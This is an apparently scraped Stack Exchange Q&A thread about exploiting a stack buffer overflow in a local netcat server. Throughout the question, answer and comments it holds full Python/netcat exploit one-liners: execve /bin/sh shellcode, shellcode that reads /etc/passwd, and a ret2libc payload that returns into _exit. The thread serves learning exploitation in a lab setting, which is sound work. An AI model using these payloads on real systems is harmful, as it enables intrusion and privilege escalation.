{
    "title": "Buffer overflow on server",
    "link": "https://reverseengineering.stackexchange.com/questions/14957/buffer-overflow-on-server",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I have a server (for reference:\n  <a href=\"http://pastebin.com/ghJX69uH\" rel=\"nofollow noreferrer\">\n   pastebin.com/ghJX69uH\n  </a>\n  ) that I can\n  <code>\n   netcat\n  </code>\n  to and it will ask to input a message.\n </p>\n <p>\n  I know it is vulnerable to buffer overflow, but I can't seem to get the shellcode to run. I have successfully pointed the return address back to the NOP slide and it hits the\n  <code>\n   /bin/sh\n  </code>\n  but it does not spawn a shell. Here is my code:\n </p>\n <pre><code>echo \"`python -c 'print \"\\x90\"*65517 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"  + \"\\xac\\xf3\\xfe\\xbf\"*10 + \"\n\"'`\" | nc 127.0.0.1 1111\n</code></pre>\n <p>\n  It's a simple buffer overflow with\n  <code>\n   [NOP SLIDE | SHELLCODE (spawn shell /bin/sh) | return address]\n  </code>\n </p>\n <p>\n  The first image shows that the return address is\n  <code>\n   0xbffef3ac\n  </code>\n  which goes to NOP sled, so all is OK! The second image shows a SIGSEGV with no shell, nothing happens.\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/j1d41.png\" rel=\"nofollow noreferrer\">\n   <img alt=\"enter image description here\" src=\"https://i.sstatic.net/j1d41.png\"/>\n  </a>\n  <a href=\"https://i.sstatic.net/s192d.png\" rel=\"nofollow noreferrer\">\n   <img alt=\"enter image description here\" src=\"https://i.sstatic.net/s192d.png\"/>\n  </a>\n </p>\n <p>\n  What's going on here? I had a look at\n  <code>\n   ebp\n  </code>\n  and it showed something weird: my\n  <code>\n   \\x90\n  </code>\n  followed by what should be my shellcode, but looking differently. Any insights on what could be wrong or how to go about this?\n </p>\n <pre><code>0xbffef42c: 0x90909090  0x90909090  0x90909090  0x90909090\n0xbffef43c: 0x90909090  0x90909090  0x90909090  0x90909090\n0xbffef44c: 0x90909090  0x50c03190  0x732f2f68  0x622f6868\n0xbffef45c: 0xe3896e69  0xbffef468  0x00000000  0x6e69622f\n0xbffef46c: 0x68732f2f  0x00000000  0xbffef3ac  0xbffef3ac\n0xbffef47c: 0xbffef3ac  0xbffef3ac  0xbffef3ac  0xbffef3ac\n0xbffef48c: 0xbffef3ac  0x00000000  0x00000000  0x00000000\n0xbffef49c: 0x00000000  0x00000000  0x00000000  0x00000000\n</code></pre>\n <p>\n  Edit: Format of code is from numberphile, shellcode is from\n  <a href=\"http://shell-storm.org/shellcode/files/shellcode-827.php\" rel=\"nofollow noreferrer\">\n   http://shell-storm.org/shellcode/files/shellcode-827.php\n  </a>\n  , which I ran and spawns a shell. I tried adding padding (I put A's) between shellcode and return address, but something strange happens again:\n </p>\n <pre><code>New code: echo \"`python -c 'print \"\\x90\"*65490 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"  + \"A\"*27 + \"\\xac\\xf4\\xfe\\xbf\" + \"\n\"'`\" | nc 127.0.0.1 1129\n\n\n0xbffef42c: 0x90909090  0x90909090  0x90909090  0xc0319090\n0xbffef43c: 0x2f2f6850  0x2f686873  0x896e6962  0x895350e3\n0xbffef44c: 0xcd0bb0e1  0x41414180  0x41414141  0x41414141\n0xbffef45c: 0x41414141  0x41414141  0x41414141  0x00000001\n0xbffef46c: 0xbffef4ac  0x08049000  0x00000004  0xbffff4a4\n0xbffef47c: 0xbffff490  0xbffff48c  0x00000004  0x00000000\n0xbffef48c: 0x00000000  0x00000000  0x00000000  0x00000000\n0xbffef49c: 0x00000000  0x00000000  0x00000000  0x00000000\n0xbffef4ac: 0x00000000  0x00000000  0x00000000  0x0000000\n</code></pre>\n <p>\n  Edit: So i managed to successfully print all of the etc/passwd, but not sure why the /bin/sh shellcode doesnt work\n </p>\n <p>\n  <strong>\n   Works: /etc/passwd\n  </strong>\n </p>\n <pre><code>echo \"`python -c 'print \"\\x90\"*65478+\"\\x31\\xc9\\x31\\xc0\\x31\\xd2\\x51\\xb0\\x05\\x68\\x73\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\\x65\\x74\\x89\\xe3\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\\x03\\x66\\xba\\xff\\x0f\\x66\\x42\\xcd\\x80\\x31\\xc0\\x31\\xdb\\xb3\\x01\\xb0\\x04\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\"  +\"AAAA\\x9c\\xf3\\xfe\\xbf\\x9c\\xf3\\xfe\\xbf\" + \"\n\"'`\" | nc 127.0.0.1 2010\n</code></pre>\n <p>\n  <strong>\n   Doesnt't work: /bin/sh\n  </strong>\n </p>\n <pre><code>echo \"`python -c 'print \"\\x90\"*65513 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"AAAA\\x9c\\xf3\\xfe\\xbf\\x9c\\xf3\\xfe\\xbf\\x9c\" + \"\n\"'`\" | nc 127.0.0.1 3003\n</code></pre>\n</div>\n</body></html>",
    "votes": "1",
    "answers": 1,
    "views": "845",
    "tags": [
        "gdb",
        "exploit",
        "buffer-overflow",
        "shellcode"
    ],
    "user": "user153882",
    "time": "Mar 21, 2017 at 21:55",
    "comments": [],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  We have two major stack protection for buffer overflows:\n </p>\n <ul>\n  <li>\n   Stack canaries\n  </li>\n  <li>\n   Non-executable stack\n  </li>\n </ul>\n <p>\n  You land on nopsled but, you get segmentation fault. Because your operating system marked program stack as non-executable and processor raises the exception when program counter addresses that segment. But, even we have an executable stack (for GCC use\n  <em>\n   -z execstack\n  </em>\n  ) your program crashes:\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/WswOt.jpg\" rel=\"nofollow noreferrer\">\n   <img alt=\"Arithmetic exception\" src=\"https://i.sstatic.net/WswOt.jpg\"/>\n  </a>\n </p>\n <p>\n  I changed shellcode to read /etc/passwd, it works until another SIGSEGV. It is not relevant why your previous shellcode doesn't work, it is a practical problem.\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/L2D4a.jpg\" rel=\"nofollow noreferrer\">\n   <img alt=\"/etc/passwd shellcode works\" src=\"https://i.sstatic.net/L2D4a.jpg\"/>\n  </a>\n </p>\n <p>\n  For another scenario:\n </p>\n <p>\n  How can we get around non-executable stack? The most common way is a method called\n  <strong>\n   ret2libc\n  </strong>\n  (return to libc) using system(const char *). But, we will use _exit(int) for simplicity. For our new attack, I compiled it with non-executable stack option and send the same stream.\n </p>\n <pre><code>$ nc localhost 1337 < exp.loit\n</code></pre>\n <p>\n  Let's look our stack:\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/pe21L.jpg\" rel=\"nofollow noreferrer\">\n   <img alt=\"Stack\" src=\"https://i.sstatic.net/pe21L.jpg\"/>\n  </a>\n </p>\n <p>\n  We can't understand which part of your input overflows where and we need that to pass the argument(s). I tried a different payload to find what goes where:\n </p>\n <pre><code>python -c 'print \"\\x90\"*65482 + \"\\x31\\xc9\\x31\\xc0\\x31\\xd2\\x51\\xb0\\x05\\x68\\x73\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\\x65\\x74\\x89\\xe3\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\\x03\\x66\\xba\\xff\\x0f\\x66\\x42\\xcd\\x80\\x31\\xc0\\x31\\xdb\\xb3\\x01\\xb0\\x04\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\"  + \"\\x90\"*12 + \"\\xac\\xf3\\xfe\\xbf\" +\"\\x00\\x11\\x22\\x33\"*2 + \"\n\"' > exp.loit\n</code></pre>\n <p>\n  We get:\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/Eb9cw.jpg\" rel=\"nofollow noreferrer\">\n   <img alt=\"Stack for new input\" src=\"https://i.sstatic.net/Eb9cw.jpg\"/>\n  </a>\n </p>\n <p>\n  We just need _exit address\n </p>\n <pre><code>gdb-peda$ p &_exit\n$1 = (<text variable, no debug info> *) 0xb7ec6f24 <_exit>\n</code></pre>\n <p>\n  Now we are ready to execute our exploit:\n </p>\n <pre><code>python -c 'print \"\\x90\"*65482 + \"\\x31\\xc9\\x31\\xc0\\x31\\xd2\\x51\\xb0\\x05\\x68\\x73\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\\x65\\x74\\x89\\xe3\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\\x03\\x66\\xba\\xff\\x0f\\x66\\x42\\xcd\\x80\\x31\\xc0\\x31\\xdb\\xb3\\x01\\xb0\\x04\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\"  + \"\\x90\"*12 + \"\\x24\\x6f\\xec\\xb7\" +\"\\x01\\x00\\x00\\x00\"*2 + \"\n\"' > exp.loit\n</code></pre>\n <p>\n  <a href=\"https://i.sstatic.net/5rlnd.jpg\" rel=\"nofollow noreferrer\">\n   <img alt=\"Final exploit\" src=\"https://i.sstatic.net/5rlnd.jpg\"/>\n  </a>\n </p>\n <p>\n  Basically ret2libc is that.\n </p>\n</div>\n</body></html>",
            "votes": "3",
            "user": "Kerim Can Kalıpcıoğlu",
            "time": "Dec 5, 2020 at 5:32",
            "is_accepted": true,
            "comments": [
                {
                    "user": "user153882",
                    "text": "<span class=\"comment-copy\">Thanks for the writeup! While i experiment with this retlibc, could you share what you used for \"read /etc/passwd\". I replaced my shellcode with that and redid the NOP sled, but still not able to get any result, strangely. Did you use a different format for your shellcode?</span>",
                    "time": null
                },
                {
                    "user": "user153882",
                    "text": "<span class=\"comment-copy\">Oh, nvm, I had to view it from gdb using  &gt; echo \"<code>python -c 'print \"\\x90\"*65482 + \"\\x31\\xc9\\x31\\xc0\\x31\\xd2\\x51\\xb0\\x05\\x68\\x73\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\\x65\\x74\\x89\\xe3\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\\x03\\x66\\xba\\xff\\x0f\\x66\\x42\\xcd\\x80\\x31\\xc0\\x31\\xdb\\xb3\\x01\\xb0\\x04\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\"  + \"\\xac\\xf3\\xfe\\xbf\"*10 + \"\\n\"'</code>\" | nc 127.0.0.1 1111`</span>",
                    "time": null
                },
                {
                    "user": "user153882",
                    "text": "<span class=\"comment-copy\">I need to be able to this with the given server which has privleges to setuid raise group privleges. Is there not a way to run it via the first way? If you are able to execute /etc/passwd, surely the no exec stack isnt working and it is possible to run other commands ?</span>",
                    "time": null
                },
                {
                    "user": "Kerim Can Kalıpcıoğlu",
                    "text": "<span class=\"comment-copy\">Try to use <b>python -c 'print \"xxxxx\" | cat | nc localhost 1337</b> with working shellcode.</span>",
                    "time": null
                },
                {
                    "user": "user153882",
                    "text": "<span class=\"comment-copy\">No success with that either, however, I've been told that for each connection a fork happens, and that a simple solution is to patch the fork instruction and make it single threaded. I can follow gdb set follow-fork-mode child to follow the process. Anything else you can make from that hint?</span>",
                    "time": null
                }
            ]
        }
    ]
}